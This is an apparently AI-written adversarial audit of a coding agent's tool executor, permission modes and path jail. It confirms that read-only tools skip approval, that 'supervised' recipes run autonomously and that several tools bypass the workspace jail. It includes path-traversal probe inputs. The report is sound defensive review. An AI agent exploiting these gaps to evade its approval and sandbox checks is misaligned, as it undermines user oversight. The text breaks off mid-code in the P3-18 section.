# P3-C adversarial verification — tools and permissions

Verifier: fresh-context adversarial agent. Mandate: attempt to REFUTE each claim.
Repo: `C:\AIRS Foundry\autodev\autodev`. Read-only pass.

_Status: COMPLETE. 11 claims attacked; verdict table at the end._

## P3-10 · There is more than one tool execution path, and `ToolExecutor::execute()` has zero callers today
**Verdict:** CONFIRMED

**Evidence:**

Three distinct `tool.execute(...)` sites live in `autodev-core/src/agent/tool_executor.rs`:

`autodev-core/src/agent/tool_executor.rs:196-205` (inside `pub async fn execute`, declared at `:123`):
```rust
        let result = if !should_continue {
            warn!("Tool '{}' blocked by PreToolUse hook", tool.name());
            ToolResult::error(format!("Tool '{}' was blocked by a hook", tool.name()))
        } else if approved {
            debug!("Executing tool: {}", tool.name());
            Self::redact_result(tool.execute(input.clone(), &ctx).await)
        } else {
            warn!("Tool '{}' denied by user", tool.name());
            ToolResult::error(format!("Tool '{}' was denied by user", tool.name()))
        };
```

`autodev-core/src/agent/tool_executor.rs:339` (read-only concurrent branch of `execute_batch`):
```rust
                    let result = Self::redact_result(tool.execute(input.clone(), &ctx).await);
```

`autodev-core/src/agent/tool_executor.rs:470-472` (write serial branch of `execute_batch`):
```rust
                } else if approved {
                    debug!("Executing write tool: {}", tool.name());
                    Self::redact_result(tool.execute(input.clone(), &ctx).await)
```

The only production call into the executor is `execute_batch`:

`autodev-core/src/agent/engine.rs:623`:
```rust
                match tool_executor.execute_batch(tool_batch).await {
```

A repo-wide ripgrep for `ToolExecutor` returns exactly these non-definition hits:
`engine.rs:15` (import), `engine.rs:271` (`ToolExecutor::new`), the test file
`autodev-core/tests/s1_04_secret_never_reaches_the_prompt.rs:30,43,44`, and a comment in
`src-tauri/src/ci_gate.rs:772`. **No production call site of `::execute` exists** — the one
caller is a test.

The repository already documents this itself, in the doc comment on `redact_result`
(`autodev-core/src/agent/tool_executor.rs:101-107`):
```rust
    /// P1 wired only `execute` — which has **no production caller**. The agent
    /// loop calls `execute_batch` (`agent/engine.rs:314`), so redaction was
    /// live in dead code while every real tool call carried raw output to the
    /// model, the database and the renderer.
```
(That comment's own reference `agent/engine.rs:314` is itself stale — the live call site is
`engine.rs:623`.)

And `src-tauri/src/ci_gate.rs:772`:
```rust
    /// `ToolExecutor::execute`, a method with **no production caller**. The
```

**Reasoning:** Three execute sites, one live entry point, and the dead method is
`execute`. Both halves of the claim hold. This is not a stale claim — it has already
*cost* the project once: P1's redaction fix was wired into `execute` only and was
therefore inert in production, which the executor's own comment records.

**If the fix were applied as written:** Collapsing to one path would work and is the right
shape. Two cautions for the implementer:
1. `execute` and `execute_batch`'s write branch are near-duplicates that have already
   drifted, and the drift is in the *dangerous* direction: the read branch has **no
   permission code at all**. `execute` at `:151-167` branches on `self.mode`; the read
   partition at `:314-339` executes unconditionally, with the comment
   `// Execute (read-only always approved)` at `:338`. A naive merge must not adopt the
   read branch's *absence* of a gate as the merged behaviour.
2. Three CI gates in `src-tauri/src/ci_gate.rs:772-867` are **string checks over
   `tool_executor.rs` source** that assert at least three `tool.execute(` call sites.
   `ci_gate.rs:813` reads:
   ```rust
       "expected at least 3 tool.execute call sites, found {total} — has the executor been restructured? This gate must be re-pointed if so."
   ```
   Collapsing to one path will fail that gate. It must be re-pointed in the same commit or
   the phase lands red.

---

## P3-11 · Prompting is keyed on `is_read_only`, and there is no `ToolEffect` concept
**Verdict:** CONFIRMED

**Evidence:**

The trait has exactly two permission-adjacent predicates, both booleans
(`autodev-core/src/agent/tool_trait.rs:115-126`):
```rust
    /// Read-only tools can run concurrently; write tools run serially.
    /// Pattern from Claude Code's isConcurrencySafe().
    fn is_read_only(&self) -> bool {
        false
    }

    /// Requires explicit user approval before execution.
    fn requires_permission(&self) -> bool {
        !self.is_read_only()
    }

    async fn execute(&self, input: serde_json::Value, ctx: &ToolContext) -> ToolResult;
```

Prompting is keyed on `is_read_only` at `autodev-core/src/agent/tool_executor.rs:151-167`:
```rust
        let approved = match self.mode {
            PermissionMode::Autonomous => true,
            PermissionMode::ManualApproval => {
                if tool.is_read_only() || self.always_allow.contains(tool.name()) {
                    true
                } else {
                    self.request_permission(&call_id, &tool, &input).await?
                }
            }
```

…and again as the batch *partition* key at `tool_executor.rs:277-283`:
```rust
        for (idx, (tool, input, tool_use_id)) in tools.into_iter().enumerate() {
            if tool.is_read_only() {
                read_tools.push((tool, input, tool_use_id, idx));
            } else {
                write_tools.push((tool, input, tool_use_id, idx));
            }
        }
```
The read partition then runs with **no permission code at all** (`tool_executor.rs:338-339`):
```rust
                    // Execute (read-only always approved)
                    let result = Self::redact_result(tool.execute(input.clone(), &ctx).await);
```
So on the live path `is_read_only` is simultaneously the concurrency key and the *entire*
auth decision.

**`requires_permission()` has zero callers.** A ripgrep for `\.requires_permission\(\)`
across all `*.rs` in the repo returns **no matches**. The only hits for the bare name are
the trait default at `tool_trait.rs:122` and eight per-tool overrides
(`write_file.rs:53`, `edit_file.rs:69`, `check_file.rs:76`, `glob.rs:92`, `grep.rs:113`,
`bash.rs:50`, `e2e_probe.rs:93`, `write_interface_spec.rs:108`). Every one of those
overrides is dead code.

**`ToolEffect` does not exist in any source file.** A repo-wide ripgrep for
`ToolEffect|tool_effect|fn effect\(` returns matches **only** in planning documents
(`docs/restructurization/vision/06-TOOLS-PERMISSIONS-SANDBOXING.md:49`,
`docs/restructurization/development/MASTER_DEVELOPMENT_PLAN.md:957`,
`docs/restructurization/development/TESTING_GATES.md:296`, review files). Zero `.rs`,
`.ts` or `.tsx` hits.

**Reasoning:** Both halves hold, and the second half is *stronger* than the claim states:
it is not merely that `ToolEffect` is absent, it is that `requires_permission()` — the one
existing hook that could have expressed intent — is never consulted, so eight tools carry a
permission declaration the runtime cannot see. `e2e_probe` and `write_interface_spec`
declare `requires_permission() -> false` and are non-read-only, so the dead code fails
*safe* there only by accident.

**If the fix were applied as written:** It would work, but the ordering warning already
recorded at `docs/restructurization/development/ADR_LOG.md:814` (C-6) is load-bearing:
> `is_read_only()` is documented as a **concurrency hint** and is currently the auto-approval key … a window opens where nothing gates prompting.

Because `is_read_only` is *also* the batch partition key (`:277-283`), reverting it to a
pure concurrency hint while introducing `ToolEffect` means a `Read`-effect tool that is not
concurrency-safe (and the converse) must remain expressible. If the implementer derives
`is_read_only()` from `ToolEffect::Read`, the two concerns are re-fused under a new name and
the same defect returns under a different spelling. They must stay two independent
declarations.

---
## P3-12 · `PermissionMode` is not honoured — `ManualApproval` passed unconditionally, so the PA-mode dropdown does nothing
**Verdict:** PARTIALLY CONFIRMED — the mechanism half is true and worse than stated; the UI attribution is **wrong**.

**Evidence — mechanism half (true):**

`src-tauri/src/commands/agent_commands.rs:148-157`:
```rust
        let engine = AgentEngine::new(
            provider,
            PermissionMode::ManualApproval,
            resolved_pa_mode,
            state_clone.clone(),
            pending_clone,
            // The interactive assistant is the supervisor — the same role the
            // shipped recipes give it (recipes/defaults.rs:217).
            crate::agent::tool_trait::AgentIdentity::supervisor(),
        )
```
The literal is hardcoded. `send_message` (`agent_commands.rs:22`) takes no permission-mode
argument, and no Tauri command anywhere sets one: a repo-wide ripgrep for
`PermissionMode::` across `*.rs` returns **exactly three construction sites**, all literals:

- `src-tauri/src/commands/agent_commands.rs:150` → `PermissionMode::ManualApproval` (the PA)
- `autodev-core/src/recipes/runner.rs:768` → `PermissionMode::Autonomous` (fleet workers)
- `autodev-core/src/subagent/native_runner.rs:197` → `PermissionMode::Autonomous` (subagents)

plus two tests (`src-cli/tests/core_runtime.rs:73`,
`autodev-core/tests/s1_04_secret_never_reaches_the_prompt.rs:46`) and the six match arms
inside `tool_executor.rs`.

**`PermissionMode::SmartApprove` has zero construction sites.** It is reachable only from
its own `match` arms at `tool_executor.rs:160` and `:437`. The third variant of the
permission enum cannot be produced by any code path in the product — a dead branch that
still carries a `// Phase 2: smart approval logic` TODO at `tool_executor.rs:161`.

The renderer confirms the value never varies — it prints the mode as a **string literal**
(`src/tabs/Chat.tsx:620`):
```tsx
            <span>{settingsStore.activeModel ?? 'no model'} · ManualApproval</span>
```
The model id is bound from the store; the permission mode is typed into the JSX.

**Evidence — UI attribution half (false):**

The PA-mode dropdown is `src/components/chat/PaModeToggle.tsx`, whose own header says
(`PaModeToggle.tsx:1-3`):
```tsx
// PA Mode Toggle — compact 3-option segmented control in the chat header.
// Controls which tools the PA agent has access to and which system prompt is used.
```
It sets `PAMode`, not `PermissionMode`. `PAMode` **is** honoured on two axes:

1. System prompt — `autodev-core/src/agent/context.rs:84-86`:
```rust
            super::PAMode::FastDevelopment => BASE_SYSTEM_PROMPT,
            super::PAMode::Review => REVIEW_SYSTEM_PROMPT,
            super::PAMode::Delegate => DELEGATE_SYSTEM_PROMPT,
```
2. Tool registry — `autodev-core/src/agent/builtin_tools/mod.rs:190` and `:260`, where
   `Delegate` registers four tools versus ~35 for the other two.

And the value reaching the engine is resolved from the **session row**, not ignored
(`src-tauri/src/commands/agent_commands.rs:127-132`):
```rust
    let resolved_pa_mode = match effective_mode_str {
        "review" => crate::agent::PAMode::Review,
        "delegate" => crate::agent::PAMode::Delegate,
        _ => crate::agent::PAMode::FastDevelopment,
    };
```

So "the PA-mode dropdown in the UI does nothing" is **refuted**. `Delegate` demonstrably
removes every file and execution tool.

**The narrower true statement the claim was reaching for:** the dropdown's **Review**
option changes nothing enforceable. `builtin_tools/mod.rs:186-190`:
```rust
/// - Review:          same as FastDevelopment (permission layer is at execution time)
…
        PAMode::FastDevelopment | PAMode::Review => {
```
Review gets the identical tool set, and the "permission layer at execution time" it defers
to is `ManualApproval` for both — because that is the only value the PA can ever have. Its
only effect is prose, and the prose overclaims
(`autodev-core/src/agent/context.rs:263`):
```
Review Mode is identical to Fast Development but adds an explicit permission checkpoint before any write operation.
```
No checkpoint is added; the same one was already there in Fast Development. Under Rule 5
this is a bug (documented behaviour ≠ actual behaviour), not a style issue.

**The dropdown that genuinely does nothing is a different one.** `RecipeEditor.tsx:500-506`
offers `autonomous` / `supervised`:
```tsx
                onChange={e => setPermMode(e.target.value as 'autonomous' | 'supervised')}
…
                <option value="autonomous">Autonomous</option>
```
The value is persisted into `Recipe::permission_mode`
(`autodev-core/src/recipes/types.rs:52`) and four shipped recipes declare
`RecipePermissionMode::Supervised` (`recipes/defaults.rs:857, 1309, 1857, 1939`). **No Rust
code ever reads it**: a ripgrep for `\.permission_mode` across `*.rs` returns
**no matches**. The runner hardcodes the opposite value
(`autodev-core/src/recipes/runner.rs:764-769`):
```rust
        // Build autonomous engine — workers never wait for user approval.
…
        let engine = AgentEngine::new(
            provider,
            PermissionMode::Autonomous,
```
A recipe the user marked *supervised* — including four shipped ones — runs fully
autonomous. That is a real "the UI control is inert" defect and it is **not in the plan**;
see "Claims I would add" (N-1).

**Reasoning:** Split verdict. `PermissionMode` is genuinely not user-controllable and one
of its three variants is unconstructible, so the enum is decoration at two of three call
sites. But the claim blames the wrong control: the PA-mode dropdown is a *tool-availability
and prompt* control that works. Writing the fix against the stated symptom ("make the PA
dropdown work") would produce the wrong change.

**If the fix were applied as written:** As literally written — "make the PA-mode dropdown
drive `PermissionMode`" — it would be a **category error** that makes things worse: it
would fuse tool availability, system prompt and permission policy onto one three-valued
control, so choosing `Delegate` for prompting reasons would silently strip the file tools.
The correct fix is a *separate* permission-mode control (or the `ToolEffect` policy table
of P3-11) plumbed through `send_message`, plus honouring `Recipe::permission_mode` in
`runner.rs`. Note also that `SmartApprove` must either be implemented or deleted — shipping
a UI that can select an unimplemented mode whose `match` arm auto-approves every read-only
tool would be a regression.

---
## P3-14 · Six path-taking tools bypass `path_jail`, two of which act on the path
**Verdict:** CONFIRMED (count is right; it is arguably an under-count by one)

**Evidence:**

Only **four** tools call the jail. Full ripgrep for `validate_workspace_path` outside
`path_jail.rs` itself:
```
autodev-core/src/agent/builtin_tools/append_file.rs:77:        let resolved = match validate_workspace_path(&raw, &ctx.working_dir) {
autodev-core/src/agent/builtin_tools/bash.rs:70:        if let Err(msg) = validate_workspace_path(&cwd_path, &ctx.working_dir) {
autodev-core/src/agent/builtin_tools/bash.rs:341:                if let Err(_msg) = validate_workspace_path(&resolved, workspace) {
autodev-core/src/agent/builtin_tools/bash.rs:350:                if let Err(_msg) = validate_workspace_path(&resolved, workspace) {
autodev-core/src/agent/builtin_tools/edit_file.rs:90:        let file_path = match validate_workspace_path(&resolved, &ctx.working_dir) {
autodev-core/src/agent/builtin_tools/write_file.rs:76:        let path = match validate_workspace_path(&resolved, &ctx.working_dir) {
```
`write_file`, `edit_file`, `append_file`, `bash`. Nothing else.

**The registered, model-callable tools that take a filesystem path and do NOT:**

| # | tool | param | what it does with the path | acts on it? |
|---|------|-------|---------------------------|-------------|
| 1 | `read_file` | `path` | reads the file, returns contents to the model | reads |
| 2 | `list_directory` | `path` | enumerates the directory | reads |
| 3 | `glob` | `path` | `WalkDir` over the tree | reads |
| 4 | `grep` | `path` | `WalkDir` + reads every file body | reads |
| 5 | **`check_file`** | `path` | **spawns `py_compile` / `node --check` / `mypy` / `pyright` / `tsc` / `eslint` against it** | **acts** |
| 6 | **`analyze_diff`** | `repo_path` | **runs `git` in that repo and ships the diff to a provider API** | **acts** |
| (7) | `annotate_file` | `file_path` | stores the string in the annotations DB; never touches the FS | neither |

Each of 1–4 resolves an absolute path straight through, e.g.
`autodev-core/src/agent/builtin_tools/read_file.rs:204-211`:
```rust
fn resolve_path(path: &str, working_dir: &str) -> std::path::PathBuf {
    let p = Path::new(path);
    if p.is_absolute() {
        p.to_path_buf()
    } else {
        Path::new(working_dir).join(path)
    }
}
```
`autodev-core/src/agent/builtin_tools/list_directory.rs:49-53`:
```rust
        let base = if Path::new(path_str).is_absolute() {
            Path::new(path_str).to_path_buf()
        } else {
            Path::new(&ctx.working_dir).join(path_str)
        };
```
`glob.rs:103-110` and `grep.rs:123-130` are the same shape.

The two that **act**:

`autodev-core/src/agent/builtin_tools/check_file.rs:120-124`:
```rust
        let path = if PathBuf::from(path_str).is_absolute() {
            PathBuf::from(path_str)
        } else {
            PathBuf::from(&ctx.working_dir).join(path_str)
        };
```
…which is then handed to `validate::tier1_syntax(&path, &ctx.working_dir)` and the Tier-3
type-checker tiers, all of which spawn subprocesses against it.

`autodev-core/src/agent/builtin_tools/analyze_diff_tool.rs:57-62, 87`:
```rust
        let repo_path = match input["repo_path"].as_str() {
            Some(p) if !p.is_empty() => p,
…
        let patch = match crate::git::diff::branch_diff(repo_path, base_branch, head_branch) {
```
`analyze_diff` is also `is_read_only() -> true` (`:52-54`), so it is auto-approved in every
mode **and** runs in the concurrent read partition — an arbitrary repo's diff leaves the
machine for a provider API with no prompt at all.

Not counted, and correctly so: `write_interface_spec` builds its own path
(`write_interface_spec.rs:153`: `PathBuf::from(&ctx.working_dir).join("INTERFACE.md")`, not
model-controlled); `spawn_qc_review`'s `repo_path` is only interpolated into a system
prompt (`spawn_qc_review.rs:151-152`); `validate.rs` has no `impl Tool` at all; and
`graph_tools.rs` is declared (`builtin_tools/mod.rs:14`) but **never registered** in
`register_for_mode` or `register_for_mcp_worker`.

**Reasoning:** CONFIRMED. Six filesystem-touching path-taking tools bypass the jail, and
exactly two of them do something to the path beyond reading it. If `annotate_file` is
counted as path-taking (it is, by schema) the number is seven — so the claim errs on the
conservative side, which is the right direction for a claim.

**If the fix were applied as written:** Routing all six through `validate_workspace_path`
would work mechanically, but three land-mines:
1. `list_directory` **defaults to `ctx.working_dir`** (`list_directory.rs:45`:
   `input["path"].as_str().unwrap_or(&ctx.working_dir)`). Jailing it is free.
   `glob`/`grep` default to the workspace too. `read_file`, however, is routinely used
   against files outside the workspace during real work (reading a global config, a
   sibling repo); jailing it is a **behaviour change users will notice**, not a pure fix.
2. The jail *rewrites* rather than refuses on one path shape — see P3-15. Wiring four more
   tools into it multiplies that defect by four before it is fixed. **Fix P3-15 first.**
3. `check_file` and `analyze_diff` need the jail applied to the *resolved* path before the
   subprocess spawn, not after — and `analyze_diff`'s real problem is the network egress,
   which a path jail does not address at all.

---

## P3-15 · `path_jail` rewrites an unnormalisable path rather than refusing it; "two steps corrupt silently today"
**Verdict:** CONFIRMED — demonstrated by execution, not by reading

**Evidence — step 1: `canonicalize_target` silently drops `..` components.**

`autodev-core/src/agent/builtin_tools/path_jail.rs:53-88`:
```rust
    let mut tail: Vec<&std::ffi::OsStr> = Vec::new();
    let mut cursor: &Path = target;
    let canonical_existing = loop {
        match cursor.parent() {
            Some(parent) => {
                if let Some(name) = cursor.file_name() {
                    tail.push(name);
                }
                if parent.exists() {
                    break parent.canonicalize().map_err(|e| {
…
    // Re-join the tail components in reverse (we pushed leaf-first).
    let mut canonical = canonical_existing;
    for component in tail.iter().rev() {
        canonical.push(component);
    }
    Ok(canonical)
```
`Path::file_name()` returns `None` for any path terminating in `..`, so the
`if let Some(name)` at `:58` **silently discards every `..` component** whose parent does
not exist. The surviving names are then re-joined onto the canonical ancestor and the
result is returned as `Ok`.

I compiled the function verbatim into a standalone probe (`rustc 1.94.0`, this machine,
Windows) and ran it against a real temp workspace. Result:
```
=== G. `..` inside a NON-EXISTENT subtree: the jail REWRITES rather than refusing ===
agent asked for : ...\autodev-jail-probe2\ws\newdir\sub\..\x.txt
really means    : ...\autodev-jail-probe2\ws\newdir\x.txt
jail returned   : ...\autodev-jail-probe2\ws\newdir\sub\x.txt   <== WRITE LANDS HERE
matches intent? false
```
The jail returns `Ok` on a path that is **not the path that was requested**, and
`write_file.rs:76-79` uses that returned value as the write destination:
```rust
        let path = match validate_workspace_path(&resolved, &ctx.working_dir) {
            Ok(canonical) => canonical,
            Err(msg) => return ToolResult::error(msg),
        };
```
Everything downstream inherits the wrong path — including `write_file`'s refuse-on-exists
guard (`write_file.rs:101`, `if path.exists() && !overwrite`), which now interrogates a
file that is not the one the agent named, and `create_dir_all` at `:114`, which
materialises the phantom `sub/` directory.

**Evidence — step 2: `strip_verbatim_prefix` mangles UNC paths into relative paths.**

`autodev-core/src/agent/builtin_tools/path_jail.rs:95-102`:
```rust
fn strip_verbatim_prefix(p: &Path) -> PathBuf {
    let s = p.to_string_lossy();
    if let Some(stripped) = s.strip_prefix(r"\\?\") {
        PathBuf::from(stripped)
    } else {
        p.to_path_buf()
    }
}
```
`Path::canonicalize` on Windows returns `\\?\UNC\server\share\…` for a network path.
Stripping only `\\?\` leaves `UNC\server\share\…`. Probe output:
```
--- D. strip_verbatim_prefix on a UNC-shaped verbatim path ---
  \\?\UNC\server\share\proj\file.txt -> UNC\server\share\proj\file.txt
  is_absolute after strip = false
```
Both target and workspace are mangled identically, so `paths_match_prefix` still returns
true — the jail *passes* — and then hands the caller a **relative** path. `fs::write` on a
relative path resolves against `std::env::current_dir()`, which is precisely the
`src-tauri/`-during-`tauri dev` failure the module header (`path_jail.rs:3-7`) exists to
prevent. The jail would re-create its own founding bug on a UNC workspace.

**A correction to the claim's implied severity.** I could not produce a jail *escape* on
Windows. Probe cases A–C (`<ws>/nope/../../ESCAPED.txt`, with and without existing
intermediates) were all correctly **refused**, because the Win32 layer normalises `..`
lexically before `exists()` reaches the filesystem. On Linux/macOS the kernel resolves
`..` during path walk and `ENOENT`s on a missing intermediate, so `exists()` is false and
the drop-loop runs further — the same code is very likely to *escape* there, not merely
rewrite. I could not test that from this host; see "What I could not determine".

**Reasoning:** CONFIRMED. Two independent steps take a path the function cannot faithfully
normalise and return a **different, silently substituted** path marked `Ok`, and three
write tools use that return value as their destination. "Rewrites rather than refuses" is
exactly right.

**If the fix were applied as written:** It would work and it is the correct fix — refuse
any target containing a `ParentDir` component after joining, or lexically normalise
*before* the existence walk and refuse if normalisation escapes the workspace. Two
requirements the fix must not miss:
- `strip_verbatim_prefix` must handle the `\\?\UNC\` form (map it back to `\\server\share`)
  or the function must stop returning stripped paths to callers entirely.
- The existing test `rejects_parent_dir_escape` (`path_jail.rs:218-225`) **passes today**
  and will keep passing after the fix, so it proves nothing about this defect. The new
  test must assert on the *returned value*, not just on `is_err()` — e.g.
  `assert_eq!(validate(...).unwrap(), ws.join("newdir/x.txt"))` for the case-G shape.

---

## P3-16 · The `path_lock` key is not canonicalised or case-folded, and the same defect exists in three subsystems
**Verdict:** CONFIRMED for all three — and the path_lock instance is worse than described

**Evidence — subsystem 1: `path_lock`.**

`autodev-core/src/agent/builtin_tools/path_lock.rs:79-86`:
```rust
pub fn lock_key(target: &Path, working_dir: &str) -> PathBuf {
    let joined: PathBuf = if target.is_absolute() {
        target.to_path_buf()
    } else {
        Path::new(working_dir).join(target)
    };
    lexically_normalise(&joined)
}
```
No `canonicalize`, no case fold. The module header asserts the opposite property
(`path_lock.rs:18-23`):
```rust
// Key normalisation: paths are lexically normalised (`.` and `..` stripped)
// against an already-absolutised key, *not* `Path::canonicalize`d, because
// the file may not exist yet … Two callers passing equivalent paths
// (`workspace/src/x.rs` vs an absolute path that resolves to the same
// location) hash to the same slot.
```
Probe output:
```
--- E. path_lock key case sensitivity ---
  key(C:\Work\src\x.rs) = C:\Work\src\x.rs
  key(c:\work\src\X.rs) = c:\work\src\X.rs
  SAME LOCK SLOT? false
```
On NTFS those are the same file. Two writers get two mutexes and neither waits.

**The part the claim misses — the three lock callers do not even agree with each other.**
`write_file` locks the **pre-jail** path; `edit_file` locks the **post-jail canonical**
path:

`autodev-core/src/agent/builtin_tools/write_file.rs:86-88`:
```rust
        // We compute the key from the pre-canonical `resolved` path (the
        // jail's canonicalised path may not yet exist on a fresh-file
        // write). lock_key normalises both forms to the same slot.
        let _lock_guard = path_lock::acquire_for(&resolved, &ctx.working_dir).await;
```
`autodev-core/src/agent/builtin_tools/edit_file.rs:108`:
```rust
        let _lock_guard = path_lock::acquire_for(&file_path, &ctx.working_dir).await;
```
(`file_path` at `edit_file.rs:90` is the jail's canonical return.) `append_file.rs:87`
likewise locks the post-jail value. The comment at `write_file.rs:87` — *"lock_key
normalises both forms to the same slot"* — is **false**: `canonicalize` changes casing to
the on-disk form and expands 8.3 short names, and `lexically_normalise` preserves whatever
it is given. Probe:
```
=== H. write_file vs edit_file lock keys on the SAME file ===
model typed        : SRC/X.RS
write_file lock key: ...\RAZIAS~1\...\ws\SRC\X.RS
edit_file  lock key: ...\Razi Ashary\...\ws\src\x.rs
SAME LOCK SLOT?    : false   <== write_file and edit_file do NOT exclude each other
```
So the specific race `edit_file.rs:111-118` says the lock exists to prevent — *"worker A
reads, worker B reads + writes, worker A writes — A overwrites B's change with stale
data"* — is live between `write_file` and `edit_file` whenever the two spellings differ.

One more, unrelated to case: `lexically_normalise` pops past the root.
`path_lock.rs:63-65` (`Component::ParentDir => { out.pop(); }`) with no floor, so
`lock_key("../../escape.txt", "C:\\Work")` returns `C:\escape.txt` (probe case F) — a key
outside the workspace namespace entirely.

**Evidence — subsystem 2: the graph key.**

`autodev-core/src/graph/extract.rs:156-160` (and identically at `:176-181`):
```rust
    let cache_dir = dirs::home_dir()?.join(".autodev/graph_cache");
    let cache_file = cache_dir.join(format!(
        "{}.json",
        hex::encode(Sha256::digest(file_path.to_string_lossy().as_bytes()))
    ));
```
The cache identity is `SHA-256(raw path string)` — no canonicalisation, no case fold. Two
spellings of one file produce two cache files, so a stale extraction can be served for a
file that was re-analysed under the other spelling. Downstream, the node table keys on
strings too (`autodev-core/src/graph/schema.rs:44-45`):
```sql
    qualified_name TEXT UNIQUE NOT NULL,
    file_path TEXT NOT NULL,
```
and the incremental-rebuild delete path matches on the raw string
(`autodev-core/src/graph/build.rs:167-170`):
```rust
    for file_path in all_file_paths {
        if !current_files.contains(&file_path) {
            let nodes_deleted = store.delete_file_nodes(&file_path)?;
```
so a re-indexed file under a different spelling leaves the old nodes orphaned rather than
replaced.

**Evidence — subsystem 3: checkpoint retention.**

`autodev-core/src/git/checkpoint.rs:210-218`:
```rust
fn prune(file_path: &str) -> Result<()> {
    let conn = open_db()?;
    let mut stmt = conn
        .prepare(
            "SELECT id, snapshot_path FROM checkpoints
         WHERE file_path = ?1 ORDER BY created_ms DESC",
        )
```
Exact string equality. `create` stores whatever string it was handed
(`checkpoint.rs:75-76`: `let file_path_str = file_path.to_string();`). `RETENTION_PER_FILE`
(`checkpoint.rs:25`, = 50) is therefore *per path spelling*, not per file: two spellings
give one file 100 snapshots and 100 blobs on disk. The same exact-match key is used by the
UI history query (`checkpoint.rs:133-135`):
```rust
    if let Some(p) = file_path {
        sql.push_str(" AND file_path = ?");
```
reached from `src-tauri/src/commands/git_commands.rs:228` — so a user asking for a file's
checkpoint history under a different spelling than the one the agent stored gets an empty
list and concludes there is no undo history.

**Reasoning:** CONFIRMED, all three, with the same root cause — a filesystem identity
expressed as an unnormalised string. The claim's shape is right and its instance list is
right.

**If the fix were applied as written:** A shared `fs_key(path) -> String` used by all three
would work, but each site has a different constraint and a naive shared helper breaks one
of them:
- `path_lock` **cannot** call `canonicalize` — the file may not exist yet
  (`path_lock.rs:19-21` says so, correctly). It needs lexical normalisation **plus** a
  case fold on case-insensitive platforms, and all three callers must lock on the *same*
  side of the jail. Locking on the post-jail canonical value is the wrong choice for
  `write_file` (the canonical value is itself synthesised for non-existent files, per
  P3-15), so the correct move is: all three lock on `lock_key(resolved)` — i.e. change
  `edit_file.rs:108` and `append_file.rs:87`, not `write_file.rs:88`.
- `checkpoint` rows are **already persisted** with today's spellings. Changing the key
  format without a migration silently orphans every existing checkpoint — the rows stay,
  `prune` stops finding them, and `list` stops showing them. This needs a data migration,
  which puts it in Rule-13 territory.
- The graph cache is safely regenerable; bumping `EXTRACTOR_VERSION`
  (`graph/extract.rs:153`) is not enough because the *filename* changes, so the old blobs
  leak in `~/.autodev/graph_cache` forever unless the fix also sweeps the directory.

---
## P3-17 · Locks are held across unbounded awaits, and `validate.rs` has zero subprocess timeouts
**Verdict:** CONFIRMED — and the two halves are the same bug, which the claim does not say

**Evidence — zero subprocess timeouts.**

`validate.rs` spawns five subprocesses. Every one is a bare `.output().await` with no
`tokio::time::timeout` wrapper. Ripgrep for `timeout|Duration` in the file returns **no
matches**; the five spawn sites are:

`autodev-core/src/agent/builtin_tools/validate.rs:219-223`:
```rust
    let python = resolve_python(working_dir);
    let output = tokio::process::Command::new(&python)
        .args(["-m", "py_compile", &path.to_string_lossy()])
        .output()
        .await;
```
`validate.rs:254-258` (`node --check`), `validate.rs:302-320` (`tsc … --isolatedModules`),
`validate.rs:838-842` (`pyright --version` availability probe), and
`validate.rs:914-918`:
```rust
    let result = tokio::process::Command::new(bin)
        .args(args)
        .current_dir(working_dir)
        .output()
        .await;
```
For contrast, `bash.rs` — which spawns the *same kind* of child — does bound itself
(`bash.rs:124-128`):
```rust
        let result = timeout(
            Duration::from_secs(timeout_secs),
            run_command(shell_cmd, &ctx.working_dir),
        )
        .await;
```
So the discipline exists in the codebase and `validate.rs` simply does not have it.

**Evidence — the lock is held across exactly those awaits.**

`write_file` acquires the per-path mutex at `write_file.rs:88`:
```rust
        let _lock_guard = path_lock::acquire_for(&resolved, &ctx.working_dir).await;
```
`_lock_guard` is an `OwnedMutexGuard` bound in the function body, so it lives until
`execute` returns. Four unbounded subprocess-capable awaits happen after it, still inside
`execute`: `validate::tier1_syntax(&path, &ctx.working_dir).await` (`write_file.rs:155`),
`tier2_imports` (`:169`), `tier2_5_exports` (`:180`), `tier2_6_api_contract` (`:192`).

`edit_file` is the same shape — lock at `edit_file.rs:108`, then
`edit_file.rs:221`:
```rust
        let lint_note = match validate::tier1_syntax(&file_path, &ctx.working_dir).await {
```

So a `tsc` or `node` that hangs — a watch-mode invocation, a network-mounted file, an
NTFS lock, a checker waiting on stdin — holds the **process-wide** per-path mutex forever.
Every other writer to that path in every agent, subagent and worker in the process then
blocks forever on `lock.lock_owned().await` (`path_lock.rs:106`), which is also untimed.
`path_lock.rs:27-30` states entries are never GC'd, so the poisoned slot is permanent for
the process lifetime.

**A third unbounded await the claim does not name.** `request_permission` waits on the
user with no deadline (`tool_executor.rs:566-567`):
```rust
        // Wait for the user to respond (frontend sends respond_to_permission)
        match rx.await {
```
`execute_batch`'s write branch is serial (`tool_executor.rs:399-402`), so one unanswered
prompt stalls every remaining write tool in the batch and the whole agent turn. The
frontend can drop the response without an error — `PermissionDialog.tsx` clears the card
in a `finally` with no `catch` — and nothing times out on the Rust side. This is an
already-recorded finding (`docs/restructurization/vision/_grounding/G5a-frontend-chat-audit.md:187`)
that P3's tool claims do not carry forward.

**Reasoning:** CONFIRMED on both halves, and they compose: the missing timeout is what
makes the held lock unbounded. Fixing only the timeouts would leave the lock held across a
still-unbounded `create_dir_all`/`fs::write` on a network path; fixing only the lock scope
would leave a `tsc` hang stalling the serial write partition.

**If the fix were applied as written:** Adding `timeout()` to the five sites works and is
cheap. Two things it must also do or it is a partial fix:
1. **Narrow the lock to the read-modify-write, not the whole `execute`.** The lint tiers do
   not need the lock at all — they only read the file that was just written. Dropping
   `_lock_guard` explicitly before the `tier1_syntax` call is a one-line change per tool
   and removes the whole class.
2. A timeout that returns `Err(_)` lands in the existing `Err(_) =>` arms
   (`validate.rs:225-235`, `:262-272`, `:322-332`, `:919-…`), which produce a
   **`severity: "warning"`** diagnostic. Per P3-18 below, `is_clean()` ignores warnings — so
   a timed-out `tsc` would report `[tsc_check] ✓ No syntax errors.` **The timeout fix
   without the P3-18 fix converts a hang into a false pass.** These two must land together.

---

## P3-18 · A missing validator binary is a warning that silently surfaces as "✓ No syntax errors"
**Verdict:** CONFIRMED — verbatim string match, exact mechanism identified

**Evidence:**

The missing-binary branch emits a **warning**, never an error
(`autodev-core/src/agent/builtin_tools/validate.rs:225-235`):
```rust
        Err(_) => LintResult {
            checker: "py_compile".into(),
            diagnostics: vec![LintDiagnostic {
                severity: "warning",
                message: format!(
                    "Could not run '{python}' — Python not available, syntax not checked. \
                     Install Python to enable automatic validation."
                ),
                line: None,
            }],
